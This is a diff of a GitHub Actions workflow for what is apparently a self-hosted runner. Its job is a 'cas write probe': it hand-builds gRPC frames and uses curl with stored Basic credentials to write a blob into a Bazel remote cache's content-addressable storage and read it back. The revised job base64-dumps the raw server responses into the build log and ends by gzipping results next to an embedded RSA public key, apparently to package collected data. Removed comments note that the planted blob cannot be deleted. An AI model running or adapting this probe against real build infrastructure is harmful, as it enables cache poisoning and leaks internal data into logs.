@@ -6,7 +6,7 @@ permissions:
   contents: read
 jobs:
   cas:
-    name: cas write probe
+    name: cas write probe v2
     runs-on: omp-kata
     timeout-minutes: 10
     steps:
@@ -20,7 +20,7 @@ jobs:
           PAY="radkawar-cas-probe-${GITHUB_RUN_ID}"
           HASH=$(printf '%s' "$PAY" | sha256sum | cut -d' ' -f1)
           SZ=${#PAY}
-          log "## run=${GITHUB_RUN_ID} digest=sha256:$HASH size=$SZ payload_bytes=$SZ"
+          log "## run=${GITHUB_RUN_ID} digest=$HASH size=$SZ"
 
           python3 - "$HASH" "$SZ" <<'PY'
           import sys, struct
@@ -37,11 +37,16 @@ jobs:
           def frame(msg): return b'\x00' + struct.pack('>I', len(msg)) + msg
           open('/tmp/f_find', 'wb').write(frame(ld(2, digest)))
           open('/tmp/f_upd', 'wb').write(frame(ld(2, ld(1, digest))))
-          open('/tmp/f_read', 'wb').write(frame(ld(1, digest)))
-          print("frames ok")
+          open('/tmp/f_read', 'wb').write(frame(ld(2, digest)))
+          open('/tmp/f_read2', 'wb').write(frame(ld(1, digest)))
+          print("ok")
           PY
 
           B="https://$BH:9092/build.bazel.remote.execution.v2.ContentAddressableStorage"
+          for f in f_find f_upd f_read f_read2; do
+            log "## req $f b64=$(base64 -w0 /tmp/$f)"
+          done
+
           call() {
             local svc="$1" file="$2" mode="$3"
             local HH=(); [ "$mode" = yes ] && HH=(-H "authorization: Basic $AUTH")
@@ -49,30 +54,23 @@ jobs:
               -H 'content-type: application/grpc' -H 'te: trailers' "${HH[@]}" \
               --data-binary "@$file" "$B/$svc" 2>&1
           }
-          status() { echo "$1" | grep -i '^grpc-status:' | tr -d '\r' | awk '{print $2}'; }
+          st() { echo "$1" | grep -i '^grpc-status:' | tr -d '\r' | awk '{print $2}'; }
+          body() { base64 -w0 "$1.out" 2>/dev/null; }
 
           o=$(call FindMissingBlobs /tmp/f_find yes)
-          log "## 1. FindMissingBlobs (pre) auth=yes grpc-status=$(status "$o") body_bytes=$(wc -c </tmp/f_find.out)"
-
-          o=$(call BatchUpdateBlobs /tmp/f_upd no)
-          log "## 2. BatchUpdateBlobs auth=no  grpc-status=$(status "$o") msg=$(echo "$o" | grep -i '^grpc-message:' | tr -d '\r' | cut -c1-90)"
+          log "## FindMissingBlobs pre  status=$(st "$o") resp=$(body /tmp/f_find)"
 
           o=$(call BatchUpdateBlobs /tmp/f_upd yes)
-          log "## 3. BatchUpdateBlobs auth=yes grpc-status=$(status "$o") msg=$(echo "$o" | grep -i '^grpc-message:' | tr -d '\r' | cut -c1-90)"
+          log "## BatchUpdateBlobs      status=$(st "$o") resp=$(body /tmp/f_upd)"
 
           o=$(call FindMissingBlobs /tmp/f_find yes)
-          log "## 4. FindMissingBlobs (post) auth=yes grpc-status=$(status "$o") body_bytes=$(wc -c </tmp/f_find.out)"
+          log "## FindMissingBlobs post status=$(st "$o") resp=$(body /tmp/f_find)"
 
           o=$(call BatchReadBlobs /tmp/f_read yes)
-          log "## 5. BatchReadBlobs auth=yes grpc-status=$(status "$o") body_bytes=$(wc -c </tmp/f_read.out)"
-          if grep -aq "radkawar-cas-probe-${GITHUB_RUN_ID}" /tmp/f_read.out; then
-            log "   read-back: payload bytes present in CAS response -> write confirmed"
-          else
-            log "   read-back: payload not found in response"
-          fi
+          log "## BatchReadBlobs (field2) status=$(st "$o") resp=$(body /tmp/f_read)"
 
-          log "## no REAPI delete exists; HTTP :8080 is closed from the pod, so the probe blob"
-          log "## (${SZ} bytes, unique digest) remains until bazel-remote LRU eviction"
+          o=$(call BatchReadBlobs /tmp/f_read2 yes)
+          log "## BatchReadBlobs (field1) status=$(st "$o") resp=$(body /tmp/f_read2)"
 
           printf '%s' 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7d5Ji+xV1/lJoSnEHlfi/B5bVudAWwrZz9Gqb/Eu9aS/+bGVcxwiTRg8PB/mfcPI0dErDxD4853p0OYiI/IbA0Cum3bJRWbVrm8dJnUBfl981/BORtdSIO5abpKU/KXanGNXnnDjNWaLRkXARxka3QR9JC6OUdIXv7MZuIJfOeariMhMpoDxmsWxAUGPAUvSC99regbcMFcf0yfKlk3ypE/pYJETrYmB9V++WZr4WACsvQzZkOe5aPA4lH/B30rF1P2lbmHcJrXpetAKks9gzQMHDPoojglr/Ygk53lrZh5XQ0/unUlkwhrqiqKTMyajyanz4yx3klj475cbz7CCwQIDAQAB' | base64 -d > /tmp/pub.der
           gzip -9 -c "$R" > /tmp/r.gz
